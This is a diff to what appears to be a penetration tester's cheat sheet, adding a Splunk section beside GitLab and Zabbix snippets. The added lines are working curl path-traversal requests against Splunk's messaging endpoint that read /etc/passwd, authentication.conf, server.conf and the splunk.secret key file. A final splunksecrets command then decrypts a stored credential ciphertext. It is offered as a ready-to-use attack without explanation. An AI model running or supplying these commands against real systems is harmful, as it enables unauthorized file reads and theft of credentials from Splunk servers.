@@ -292,6 +292,13 @@ user.password_confirmation = '123qweasdF!'
 user.save!
 Login: https://git.$DOM/$USERNAME
 
+[*] Splunk
+curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd'
+curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf'
+curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/server.conf'
+curl --path-as-is 'http://$TARGET/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret' -s | tee splunk.secret
+splunksecrets splunk-decrypt -S splunk.secret --ciphertext '$7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY='
+
 [*] Zabbix
 +---------- Login Get Auth Key ----------+
 curl \
